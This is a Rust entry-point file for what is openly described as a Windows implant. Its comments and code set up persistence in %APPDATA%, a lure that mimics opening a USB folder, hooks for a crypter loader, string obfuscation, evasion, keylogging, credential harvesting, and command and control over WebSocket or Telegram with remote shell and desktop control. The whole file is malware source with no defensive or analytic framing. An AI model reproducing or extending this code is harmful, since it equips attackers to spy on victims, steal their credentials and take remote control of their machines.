//! Windows implant: self-installs (persistence), beacons over WebSocket,
//! streams the desktop as JPEG frames, executes remote mouse/key/shell.

// No console window on the target — the USB lure looks like a folder open.
#![cfg_attr(windows, windows_subsystem = "windows")]

#[cfg(windows)]
mod capture;
#[cfg(windows)]
mod evasion;
#[cfg(windows)]
mod harvest;
#[cfg(windows)]
mod input;
#[cfg(windows)]
mod keylog;
#[cfg(windows)]
mod obf;
#[cfg(windows)]
mod persist;
#[cfg(windows)]
mod telegram;
#[cfg(windows)]
mod tg_c2;

mod c2;

#[tokio::main]
async fn main() {
    // Diagnostic: prove which compile-time values were baked in, without
    // printing any secret. Useful to verify the `.env` -> build.rs bridge.
    if std::env::args().any(|a| a == "--print-config") {
        println!(
            "tg_token={} tg_chat={} tg_secret={} tg_auto={} c2_url={}",
            option_env!("TG_TOKEN").is_some(),
            option_env!("TG_CHAT").is_some(),
            option_env!("TG_SECRET").is_some(),
            option_env!("TG_AUTO").is_some(),
            option_env!("C2_URL").is_some(),
        );
        return;
    }

    #[cfg(windows)]
    {
        capture::init_dpi();
        // When launched by the crypter loader, the loader owns persistence;
        // don't copy this (plaintext temp) executable to %APPDATA%.
        let no_install = std::env::args().any(|a| a == obf::de(obf::M_NO_INSTALL));
        if !no_install {
            persist::install();
        }
        if telegram::enabled() && telegram::auto() {
            tokio::spawn(telegram::auto_harvest_loop());
        }
        if telegram::enabled() {
            // Telegram-only: no WebSocket C2, commands arrive by long poll.
            tg_c2::run().await;
            return;
        }
    }
    c2::run().await;
}
